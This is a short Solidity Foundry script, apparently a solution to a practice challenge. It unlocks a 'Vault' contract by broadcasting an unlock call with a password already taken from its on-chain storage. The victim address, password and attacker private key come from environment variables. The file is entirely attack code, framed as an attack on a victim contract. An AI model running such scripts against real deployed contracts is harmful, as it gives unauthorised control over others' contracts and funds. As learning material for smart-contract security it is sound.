// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultAttack is Script{
  function run() public{
    address vaultAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    Vault vault = Vault(vaultAddress);

    bytes32 password = vm.envBytes32("PASSWORD");
    uint256 attackerPK = vm.envUint("PRIVATE_KEY");

    vm.broadcast(attackerPK);
    vault.unlock(password);
  }
}